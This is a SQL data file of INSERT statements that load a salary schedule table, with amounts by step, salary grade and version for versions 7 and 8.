INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '23', '79034.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '23', '80324.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '23', '81635.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '23', '82967.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '23', '84321.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '24', '85074.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '24', '86462.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '24', '87874.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '24', '89308.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '24', '90766.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '24', '92248.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '24', '93753.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '24', '95283.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '25', '96985.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '25', '98568.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '25', '100176.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '25', '101811.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '25', '103473.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '25', '105162.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '25', '106879.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '25', '108623.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '26', '109593.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '26', '111381.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '26', '113200.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '26', '115047.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '26', '116925.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '26', '118833.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '26', '120772.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '26', '122744.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '27', '123839.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '27', '125861.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '27', '127915.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '27', '130003.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '27', '132125.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '27', '134281.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '27', '136473.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '27', '138701.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '28', '139939.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '28', '142223.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '28', '144544.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '28', '146903.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '28', '149300.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '28', '151738.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '28', '154215.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('9', '28', '156731.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '28', '156731.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '29', '158131.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '29', '160712.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '29', '163335.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '29', '166001.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '29', '168710.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '29', '171464.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '29', '174262.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '29', '177107.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '30', '178688.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '30', '181604.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '30', '184568.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '30', '187581.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '30', '190642.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '30', '193754.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '30', '196916.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '30', '200130.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '31', '262965.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '31', '268101.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '31', '273338.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '31', '278676.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '31', '284120.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '31', '289669.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '31', '295327.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '31', '301095.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '32', '313512.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '32', '319835.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '32', '326285.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '32', '332865.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '32', '339577.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '32', '346426.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '32', '353413.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '32', '360539.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '33', '395858.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '33', '407734.00', '7');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '1', '12034.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '1', '12134.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '1', '12236.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '1', '12339.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '1', '12442.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '1', '12545.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '1', '12756.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '1', '12651.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '2', '12790.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '2', '12888.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '2', '12987.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '2', '13087.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '2', '13187.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '2', '13288.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '2', '13390.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '2', '13493.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '3', '13572.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '3', '13677.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '3', '13781.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '3', '13888.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '5', '15750.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '3', '13995.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '3', '14101.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '3', '14210.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '3', '14319.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '4', '14400.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '4', '14511.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '4', '14622.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '14', '31844.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '4', '14735.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '4', '14848.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '4', '14961.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '4', '15077.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '4', '15192.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '5', '15275.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '5', '15393.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '5', '15511.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '5', '15630.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '5', '15871.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '5', '15993.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '5', '16115.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '6', '16200.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '6', '16325.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '6', '16450.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '6', '16577.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '6', '16704.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '6', '16832.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '6', '16962.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '6', '17092.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '7', '17179.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '7', '17311.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '7', '17444.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '7', '17578.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '7', '17713.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '7', '17849.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '7', '17985.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '7', '18124.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '8', '18251.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '8', '18417.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '8', '18583.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '8', '18751.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '8', '18920.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '8', '19091.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '8', '19264.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '8', '19438.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '9', '19593.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '9', '19922.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '9', '20089.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '9', '19757.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '9', '20257.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '9', '20426.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '9', '20597.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '9', '20769.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '10', '21205.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '10', '21382.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '10', '21561.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '10', '21741.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '10', '21923.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '10', '22106.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '10', '22291.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '10', '22477.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '11', '23877.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '11', '24161.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '11', '24450.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '11', '24742.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '11', '25038.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '11', '25339.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '11', '25643.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '11', '25952.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '12', '26052.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '12', '26336.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '12', '26624.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '12', '26915.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '12', '27210.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '12', '27509.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '12', '27811.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '12', '28117.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '13', '28276.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '13', '28589.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '13', '28905.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '13', '29225.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '13', '29550.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '13', '29878.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '13', '30210.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '13', '30547.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '14', '30799.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '14', '31143.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '14', '31491.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '14', '32200.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '14', '32561.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '14', '32927.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '14', '33297.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '15', '33575.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '15', '33953.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '15', '34336.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '15', '34724.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '15', '35116.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '15', '35513.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '15', '35915.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '15', '36323.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '16', '36628.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '16', '37044.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '16', '37465.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '16', '37891.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '16', '38323.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '17', '39986.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '17', '40444.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '17', '40907.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '17', '41376.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '17', '41851.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '17', '42332.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '17', '42818.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '17', '43311.00', '8');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '16', '38760.00', '8');
